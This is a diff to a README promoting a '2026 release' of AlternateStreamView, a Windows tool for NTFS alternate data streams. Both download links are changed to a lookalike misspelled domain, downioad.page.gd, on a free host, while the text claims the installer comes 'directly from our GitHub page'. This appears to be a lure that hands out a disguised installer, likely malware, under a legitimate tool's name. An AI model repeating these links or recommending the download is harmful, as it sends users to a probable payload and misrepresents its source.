@@ -2,7 +2,7 @@
 
 AlternateStreamView is an advanced tool designed for Windows users to seamlessly explore and manage NTFS alternate data streams. In this 2026 release, the software introduces improved performance, a sleek interface, and robust features to handle streams on local drives. Whether you're a system administrator or a curious user, AlternateStreamView simplifies the process of viewing, analyzing, and cleaning up hidden data streams without technical hassle.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -60,6 +60,6 @@ A4: Deleting streams can free space, but caution is advised as some streams may 
 
 To get started with AlternateStreamView, download the latest version directly from our GitHub page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides the most recent installer, ensuring you have access to all new features and security updates for 2026. Remember to check back periodically for future releases and improvements.
